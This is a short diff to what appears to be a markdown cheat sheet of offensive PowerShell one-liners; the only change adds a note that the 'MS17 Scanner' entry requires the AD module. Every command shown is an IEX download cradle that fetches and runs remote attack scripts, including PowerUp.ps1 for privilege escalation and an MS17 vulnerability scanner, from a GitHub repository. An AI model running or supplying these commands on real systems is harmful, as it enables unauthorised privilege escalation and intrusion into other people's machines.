@@ -20,6 +20,6 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/PowerUp.ps1')
 
-### MS17 Scanner
+### MS17 Scanner (Requires Powershell AD Module)
 
 IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/jdksec/RemoteTools/master/MS17.ps1')
